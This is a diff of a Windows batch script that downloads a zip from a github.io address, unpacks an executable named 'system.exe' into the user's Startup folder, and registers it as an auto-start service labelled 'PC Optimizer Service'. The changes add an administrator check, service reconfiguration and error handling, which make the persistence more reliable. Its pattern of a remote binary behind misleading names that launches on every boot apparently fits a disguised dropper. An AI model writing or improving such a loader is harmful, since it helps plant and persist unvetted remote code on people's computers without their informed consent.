@@ -7,7 +7,7 @@ set "URL=https://luckiestpancake.github.io/Files/test.zip"
 set "ZIP_NAME=downloaded_app.zip"
 set "TARGET_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\pc-optimizer"
 set "EXE_NAME=system.exe"
-set "SERVICE_NAME=PCOptimizer"
+set "SERVICE_NAME=PCOptimizerService2024"  :: More unique service name
 set "SERVICE_DISPLAY=PC Optimizer Service"
 
 echo Creating Target Directory...
@@ -36,19 +36,45 @@ del "%TARGET_DIR%\%ZIP_NAME%"
   echo start "" "%EXE_NAME%"
 ) > "%TARGET_DIR%\%BAT_FILE%"
 
+:: Check if running as administrator
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    echo This script requires administrator privileges to create a service.
+    echo Please run this script as administrator.
+    pause
+    exit /b 1
+)
+
 echo Checking if service already exists...
 sc query "%SERVICE_NAME%" >nul 2>&1
 if %errorlevel% equ 1060 (
     echo Service does not exist. Creating new service...
-    sc create "%SERVICE_NAME%" binPath= "cmd.exe /c \"%TARGET_DIR%\%BAT_FILE%\"" start= auto DisplayName= "%SERVICE_DISPLAY%"
+    sc create "%SERVICE_NAME%" binPath= "cmd.exe /c \"%TARGET_DIR%\%BAT_FILE%\"" start= auto DisplayName= "%SERVICE_DISPLAY%" type= own
+    if %errorlevel% neq 0 (
+        echo Failed to create service. Error code: %errorlevel%
+        pause
+        exit /b 1
+    )
     echo Service created successfully.
 ) else (
-    echo Service already exists. Updating service...
-    sc config "%SERVICE_NAME%" binPath= "cmd.exe /c \"%TARGET_DIR%\%BAT_FILE%\"" start= auto DisplayName= "%SERVICE_DISPLAY%"
+    echo Service already exists. Stopping and updating service...
+    sc stop "%SERVICE_NAME%"
+    timeout /t 3 /nobreak >nul
+    sc config "%SERVICE_NAME%" binPath= "cmd.exe /c \"%TARGET_DIR%\%BAT_FILE%\"" start= auto DisplayName= "%SERVICE_DISPLAY%" type= own
+    if %errorlevel% neq 0 (
+        echo Failed to update service. Error code: %errorlevel%
+        pause
+        exit /b 1
+    )
     echo Service updated successfully.
 )
 
 echo Starting service...
 sc start "%SERVICE_NAME%"
+if %errorlevel% neq 0 (
+    echo Failed to start service. Error code: %errorlevel%
+    pause
+    exit /b 1
+)
 
-echo Installation complete.
+echo Installation complete. The service is now running and will start automatically on boot.
